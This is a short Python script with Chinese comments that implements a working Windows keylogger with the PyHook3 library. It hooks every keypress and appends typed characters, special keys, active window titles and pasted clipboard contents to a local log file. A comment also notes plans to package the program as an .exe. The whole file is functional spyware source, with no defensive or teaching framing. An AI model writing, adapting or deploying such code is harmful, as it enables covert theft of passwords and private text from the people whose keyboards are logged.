# coding=utf-8
# 第三方包连接：https://www.lfd.uci.edu/~gohlke/pythonlibs
import PyHook3
import pythoncom
import win32clipboard

FileName = 'key_board_log.txt'
key_window_name = None

'''
需要看！
windowsGUI自动化之pywinauto实战
如何将程序打包成.exe文件
'''

# 回调函数
def onKeyBoardEvent(event):
    # print('MessageName:', event.MessageName)
    # print('Message:', event.Message)
    # print('Time:', event.Time)
    # print('Window:', event.Window)
    # print('WindowName:', event.WindowName)
    # print('Ascii:', event.Ascii, chr(event.Ascii))
    # print('Key:', event.Key)
    # print('KeyID:', event.KeyID)
    # print('ScanCode:', event.ScanCode)
    # print('Extended:', event.Extended)
    # print('Injected:', event.Injected)
    # print('Alt', event.Alt)
    # print('Transition', event.Transition)
    # print('---')

    # 同鼠标事件监听函数的返回值
    # 已二进制的形式写入文件，并保存到本地，设置 result 为全聚德，避免文件被覆盖
    global key_window_name
    if event.Ascii > 32 and event.Ascii < 127:
        value = str(chr(event.Ascii))
    elif event.Key == "V":      # 判断是否未 ctrl+V
        win32clipboard.OpenClipboard()
        value = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
    else:
        value = "(keys:%s)" % str(event.Key)
    current_window_name = event.WindowName
    out_put_window_name = ''
    if current_window_name != key_window_name:
        key_window_name = current_window_name
        out_put_window_name = current_window_name
    with open(FileName, 'a+') as kf:
        if out_put_window_name:
            kf.write('\n\n')
            kf.writelines(out_put_window_name)
            kf.write('\n')
        kf.write(value)

    # 使信息继续传递
    return True

def main():
    # 1.创建钩子管理对象
    hm = PyHook3.HookManager()
    # 2.注册键盘事件回调函数
    hm.KeyDown = onKeyBoardEvent

    # 3.监听事件
    hm.HookKeyboard()

    # 4.进入循环监听，需手动关闭，否则将一直处于监听状态，可以直接设置空，使用默认值
    # 善后处理，消息顺利传递
    pythoncom.PumpMessages()

if __name__ == '__main__':
    main()